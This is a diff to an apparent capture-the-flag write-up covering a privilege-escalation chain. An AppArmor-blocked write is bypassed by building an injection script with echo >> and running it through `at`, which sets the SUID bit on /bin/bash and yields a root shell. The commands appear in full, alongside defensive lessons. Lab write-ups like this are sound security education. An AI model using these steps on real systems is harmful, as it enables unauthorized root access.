@@ -231,19 +231,21 @@ AppArmor is active (`aa-status` confirms the module is loaded). A profile confin
 
 ### Bypass via `at`
 
-The `at` daemon executes scheduled jobs through `/bin/sh` in a process context outside the AppArmor profile applied to `think`'s interactive shell. Scheduling the overwrite via `at` sidesteps confinement:
+The `at` daemon executes scheduled jobs through `/bin/sh` in a process context outside the AppArmor profile applied to `think`'s interactive shell. Scheduling the overwrite via `at` sidesteps confinement.
+
+Worth noting: AppArmor's restrictions extended beyond just `/opt/run_container.sh` — `vi` and standard text editors were also blocked under `think`'s context, so even building the injection script required using `echo >>` to append line by line rather than opening an editor:
 
 ```bash
-cat /var/tmp/inject.sh
-```
-
-```bash
-#!/bin/bash
-echo "chmod +s /bin/bash" > /opt/run_container.sh
-```
-
-```bash
+echo '#!/bin/bash' >> /var/tmp/inject.sh
+echo 'echo "chmod +s /bin/bash" > /opt/run_container.sh' >> /var/tmp/inject.sh
 chmod +x /var/tmp/inject.sh
+
+cat /var/tmp/inject.sh
+# #!/bin/bash
+# echo "chmod +s /bin/bash" > /opt/run_container.sh
+```
+
+```bash
 at now -f /var/tmp/inject.sh
 # warning: commands will be executed using /bin/sh
 # job 1 at Mon Apr 20 19:56:00 2026
@@ -298,6 +300,7 @@ bash-5.0# cat /root/root.txt
 [AppArmor Bypass + SUID run_container]
     /usr/sbin/run_container (SUID root) → executes /opt/run_container.sh
     /opt/run_container.sh world-writable but AppArmor blocks direct write
+    vi also blocked → script built via echo >> to work around confinement
     at job runs outside confined context → overwrites script
     run_container executes poisoned script as root → chmod +s /bin/bash
     /bin/bash -p → euid=0 → root
@@ -312,7 +315,7 @@ bash-5.0# cat /root/root.txt
 - Exposed CMS version strings (meta generator tags) short-circuit recon — always check page source before reaching for heavier tools
 - SPIP's `oubli` deserialization path is a textbook pre-auth RCE; vendor-managed CMSes need aggressive patch cadence, not just installation and forget
 - Private keys with world-readable permissions (`644`) are as good as no protection — `chmod 600` is non-negotiable on any key material
-- AppArmor profiles restrict by process context, not just file permissions — but `at` and `cron` often run outside the confined context, making them reliable bypass vectors when direct writes are blocked
+- AppArmor profiles restrict by process context, not just file permissions — `vi` being blocked is a strong hint the profile is broad; when editors fail, fall back to `echo >>` and reach for `at`/`cron` to escape the confined context
 - World-writable scripts called by SUID binaries are an instant root path if you can write by any means; POSIX permissions alone are not sufficient protection when MAC (AppArmor/SELinux) is inconsistently applied
 
 ---
